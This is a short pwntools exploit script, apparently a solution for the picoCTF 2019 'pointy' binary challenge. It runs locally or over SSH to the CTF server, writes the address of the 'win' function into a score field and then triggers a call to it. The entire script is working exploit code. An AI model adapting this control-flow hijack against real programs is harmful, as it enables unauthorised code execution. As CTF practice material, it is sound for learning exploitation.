#!/usr/bin/env python

from pwn import *
import sys

argv = sys.argv

e = ELF('./vuln')
win = e.symbols['win']

if len(argv) > 1:
	from getpass import getpass
	ssh = ssh(host='2019shell1.picoctf.com', user='ems3t', password=getpass())
	p = ssh.process('vuln', cwd='/problems/pointy_2_030e643c8a0e842516b1c6a3ff826144')
else:
	p = process('./vuln')

p.sendlineafter('\n', 'bob')
p.sendlineafter('\n', 'frank')
p.sendlineafter('\n', 'bob')
p.sendlineafter('\n', 'frank')
p.sendlineafter('\n', str(win))			#store win function as franks score

p.sendlineafter('student\n', 'bill')
p.sendlineafter('\n', 'jerry')
p.sendlineafter('\n', 'frank')			#win function here
p.sendlineafter('\n', 'jerry')
p.sendlineafter('\n', '0')				#win function called here

p.interactive()